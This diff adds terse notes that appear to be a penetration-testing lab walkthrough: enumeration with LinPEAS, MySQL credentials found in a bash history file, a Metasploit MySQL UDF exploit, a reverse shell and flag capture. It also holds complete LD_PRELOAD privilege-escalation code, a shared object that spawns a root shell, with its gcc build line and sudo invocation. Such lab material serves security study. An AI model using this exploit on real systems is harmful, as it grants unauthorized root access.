@@ -1,0 +1,31 @@
+Pretty straight forward exploit for server1
+After exploiting server1, use post exploitation modules to gather information. You can do manually or use scripts like Linpeas, linenum
+Check all user directories
+Make sure if the user exist or its just a normal directory.
+From a bash history file in one of the user directory we find the mysql credentials of the server2. (But there isnt much in server2 mysql database)
+If there are only default databases in mysql server, go with mysql UDF exploit in metasploit.(Check this lab solution for exploit options)
+Exploiting server 3 is straight forward.
+After getting reverse shel, we can find flag1
+Escalate privilege to read the other 2 flags.
+Refer the manual enumeration method used in this box. Might help during the exam
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+
+
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+file shell.so
+
+
+id
+sudo LD_PRELOAD=/home/robert/shell.so ls
+id
+Refer internet for this exploit.
